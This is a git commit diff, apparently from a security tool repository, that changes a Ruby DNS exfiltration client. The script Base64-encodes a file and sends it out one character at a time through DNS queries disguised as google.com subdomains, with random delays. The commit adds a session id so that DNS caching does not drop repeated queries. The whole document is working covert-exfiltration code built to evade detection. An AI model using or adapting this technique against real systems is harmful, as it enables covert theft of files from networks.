46019aaf573a55786c7dcccbc47b836b876ffd99
Jonathan Claudius <jclaudius@mozilla.com>
2016-08-03 14:07:31 -0400

    Add seq to avoid DNS caching

--- exfil/dns_exfil_client.rb
+++ exfil/dns_exfil_client.rb
@@ -8,10 +8,12 @@ encoded_file = Base64.encode64(file).chomp!
 def send_me(host)
   resolver = Resolv::DNS.new(:nameserver => ["127.0.0.1"])
 
+  fqdn = host + ".google.com"
+
   begin
     Timeout::timeout(10) {
-      name = resolver.getaddress(host + ".google.com")
-      puts host
+      name = resolver.getaddress(fqdn)
+      puts fqdn
     }
   rescue Resolv::ResolvError, Timeout::Error
     #nop
@@ -19,8 +21,9 @@ def send_me(host)
 end
 
 send_me("s")
+session_id = rand(10000)
 encoded_file.chars.each do |char|
   sleep(rand(10))
-  send_me("ads" + char.ord.to_s)
+  send_me(session_id.to_s + "ads" + char.ord.to_s)
 end
 send_me("e")
